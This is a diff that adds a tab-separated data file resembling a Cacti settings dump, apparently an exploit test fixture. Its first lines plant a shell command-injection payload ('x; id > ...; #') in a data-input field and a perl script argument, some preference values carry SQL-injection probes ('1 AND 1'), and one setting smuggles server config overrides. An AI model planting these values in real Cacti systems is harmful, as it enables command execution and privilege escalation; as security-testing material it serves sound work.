@@ -1,0 +1,33 @@
+ALL_DID	2	27	x; id > /tmp/cacti-pwn-id; #
+PI_ALL	1	0	1	webhits	perl /tmp/cacti-1.2.31/scripts/webhits.pl 'x; id > /tmp/cacti-pwn-id; #'
+SU_GUEST	3	allow_graph_dates_in_future	on
+SU_GUEST	3	axis_size	
+SU_GUEST	3	client_timezone_support	0
+SU_GUEST	3	custom_fonts	
+SU_GUEST	3	day_shift_end	18:00
+SU_GUEST	3	day_shift_start	07:00
+SU_GUEST	3	default_date_format	4
+SU_GUEST	3	default_datechar	0
+SU_GUEST	3	default_timeshift	7
+SU_GUEST	3	default_timespan	7
+SU_GUEST	3	default_tree_id	1 AND 1
+SU_GUEST	3	default_view_mode	
+SU_GUEST	3	enable_hscroll	
+SU_GUEST	3	expand_hosts	
+SU_GUEST	3	first_weekdayid	1
+SU_GUEST	3	hide_disabled	on
+SU_GUEST	3	legend_size	
+SU_GUEST	3	min_tree_width	logrotate_lastrun=1794882382|path_php_binary=/usr/bin/php|path_webroot=/srv/cacti-lpe
+SU_GUEST	3	num_columns	2
+SU_GUEST	3	page_refresh	300
+SU_GUEST	3	realtime_gwindow	60
+SU_GUEST	3	realtime_interval	10
+SU_GUEST	3	realtime_nolegend	false
+SU_GUEST	3	realtime_size	90
+SU_GUEST	3	show_aggregates	on
+SU_GUEST	3	show_graph_title	
+SU_GUEST	3	title_size	
+SU_GUEST	3	tree_history	on
+SU_GUEST	3	treeview_graphs_per_page	1 AND 1
+SU_GUEST	3	unit_size	8
+SU_GUEST	3	user_language	
